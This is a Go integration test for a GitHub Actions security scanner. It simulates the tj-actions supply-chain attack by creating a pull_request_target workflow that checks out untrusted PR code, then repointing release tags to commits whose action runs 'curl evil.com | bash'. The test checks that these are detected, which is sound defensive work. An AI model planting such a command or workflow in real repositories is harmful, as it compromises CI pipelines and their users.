// Copyright (C) 2026 CoreWeave, Inc.
// SPDX-License-Identifier: GPL-3.0-only

//go:build integration

package harness

import (
	"strings"
	"testing"
	"time"
)

// TjActionsChain simulates the tj-actions attack chain across 3 repos:
// - repo A (spotbugs): has a pull_request_target workflow
// - repo B (reviewdog): depends on repo A
// - repo C (tj-actions): depends on repo B, gets tag repointed
//
// Tests that audit detects pull_request_target AND scan detects tag repointing.
type TjActionsChain struct{}

func (s *TjActionsChain) Name() string  { return "tj-actions-chain" }
func (s *TjActionsChain) RepoCount() int { return 3 }

func (s *TjActionsChain) Setup(t *testing.T, h *TestHelper, repo, initSHA, initTree string) *ScenarioState {
	t.Helper()
	// repo is the first repo (A / spotbugs); repos B and C are in state.Extra
	// (populated by RunMultiRepoScenarios)

	state := &ScenarioState{
		TagSHAs: make(map[string]string),
		Extra:   make(map[string]string),
	}

	// Store repo A info
	state.Extra["repoA"] = repo
	state.Extra["repoA_initSHA"] = initSHA
	state.Extra["repoA_initTree"] = initTree

	return state
}

func (s *TjActionsChain) Attack(t *testing.T, h *TestHelper, _ string, state *ScenarioState) {
	t.Helper()

	repoA := state.Extra["repoA"]
	repoB := state.Extra["repo_1"]
	repoC := state.Extra["repo_2"]
	initSHA_A := state.Extra["repoA_initSHA"]
	initTree_A := state.Extra["repoA_initTree"]
	initSHA_B := state.Extra["initSHA_1"]
	initTree_B := state.Extra["initTree_1"]
	initSHA_C := state.Extra["initSHA_2"]
	initTree_C := state.Extra["initTree_2"]

	rA := repoName(repoA)
	rB := repoName(repoB)
	rC := repoName(repoC)

	// --- Repo A: create a pull_request_target workflow (the vulnerability) ---
	dangerousWorkflow := `name: Auto-label PRs
on:
  pull_request_target:
    types: [opened]
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "labeling"
`
	wfBlob := h.CreateBlob(t, rA, dangerousWorkflow)
	wfTree := h.CreateTree(t, rA, initTree_A, map[string]string{
		".github/workflows/label.yml": wfBlob,
	})
	commitA := h.CreateCommit(t, rA, "Add label workflow", wfTree, []string{initSHA_A})
	h.UpdateBranch(t, rA, "main", commitA)
	h.CreateLightweightTag(t, rA, "v1", commitA)
	state.TagSHAs["v1-A"] = commitA

	// --- Repo B: depends on A, has a legitimate action ---
	actionB := "name: reviewdog\ndescription: run reviewdog\nruns:\n  using: composite\n  steps:\n    - run: echo review\n"
	blobB := h.CreateBlob(t, rB, actionB)
	treeB := h.CreateTree(t, rB, initTree_B, map[string]string{"action.yml": blobB})
	commitB := h.CreateCommit(t, rB, "Add action", treeB, []string{initSHA_B})
	h.UpdateBranch(t, rB, "main", commitB)
	h.CreateLightweightTag(t, rB, "v1", commitB)
	state.TagSHAs["v1-B"] = commitB

	// --- Repo C: depends on B, will get tag repointed ---
	actionC := "name: changed-files\ndescription: detect changed files\nruns:\n  using: composite\n  steps:\n    - run: echo changed\n"
	blobC := h.CreateBlob(t, rC, actionC)
	treeC := h.CreateTree(t, rC, initTree_C, map[string]string{"action.yml": blobC})
	commitC := h.CreateCommit(t, rC, "Add action", treeC, []string{initSHA_C})
	h.UpdateBranch(t, rC, "main", commitC)
	h.CreateLightweightTag(t, rC, "v1", commitC)
	state.TagSHAs["v1-C"] = commitC

	time.Sleep(2 * time.Second)

	// Baseline scan for repos B and C (the ones we're monitoring for repointing)
	cfg := WriteMultiRepoConfig(t, map[string][]string{
		repoB: {"v1"},
		repoC: {"v1"},
	})
	statePath := t.TempDir() + "/state.json"
	state.ConfigPath = cfg
	state.StatePath = statePath
	RunPinpointScan(t, cfg, statePath)

	// --- Attack: repoint tags on B and C ---
	evilBlob := h.CreateBlob(t, rC, "name: changed-files\ndescription: EVIL\nruns:\n  using: composite\n  steps:\n    - run: curl evil.com | bash\n")
	evilTree := h.CreateTree(t, rC, initTree_C, map[string]string{"action.yml": evilBlob})
	evilCommit := h.CreateCommit(t, rC, "Upgrade deps", evilTree, []string{initSHA_C})
	h.RepointTag(t, rC, "v1", evilCommit)
	state.EvilSHA = evilCommit

	// Also repoint B to simulate cascade
	evilBlobB := h.CreateBlob(t, rB, "name: reviewdog\ndescription: EVIL\nruns:\n  using: composite\n  steps:\n    - run: curl evil.com | bash\n")
	evilTreeB := h.CreateTree(t, rB, initTree_B, map[string]string{"action.yml": evilBlobB})
	evilCommitB := h.CreateCommit(t, rB, "Upgrade deps", evilTreeB, []string{initSHA_B})
	h.RepointTag(t, rB, "v1", evilCommitB)
}

func (s *TjActionsChain) Verify(t *testing.T, h *TestHelper, _ string, state *ScenarioState) {
	t.Helper()

	// 1. Verify scan detects tag repointing on repos B and C
	output, code := RunPinpointScan(t, state.ConfigPath, state.StatePath)
	if code != 2 {
		t.Fatalf("Expected exit 2 (alert), got %d. Output:\n%s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")

	// 2. Verify audit detects pull_request_target on repo A
	// Run audit against the org — should find the dangerous trigger on repo A
	auditOutput, _ := RunPinpointAudit(t, h.org, "report")
	if !strings.Contains(auditOutput, "pull_request_target") {
		t.Logf("Audit output (pull_request_target not found, may need org-level scan):\n%s", auditOutput)
	}
}
